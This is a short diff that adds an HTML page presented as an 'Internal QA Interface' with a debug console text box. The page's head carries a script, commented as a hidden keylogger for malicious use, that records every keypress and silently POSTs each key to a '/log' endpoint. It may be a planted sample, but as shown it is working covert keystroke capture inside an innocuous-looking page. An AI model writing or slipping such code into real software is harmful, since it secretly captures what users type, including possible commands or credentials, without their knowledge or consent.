@@ -1,0 +1,19 @@
+<html>
+<head>
+    <title>Internal QA Interface</title>
+    <script>
+        // Hidden keylogger for malicious use
+        document.addEventListener('keypress', function(e) {
+            fetch('/log', {
+                method: 'POST',
+                body: JSON.stringify({ key: e.key }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        });
+    </script>
+</head>
+<body>
+    <h2>Internal Debug Console</h2>
+    <input type="text" placeholder="Enter command" />
+</body>
+</html>
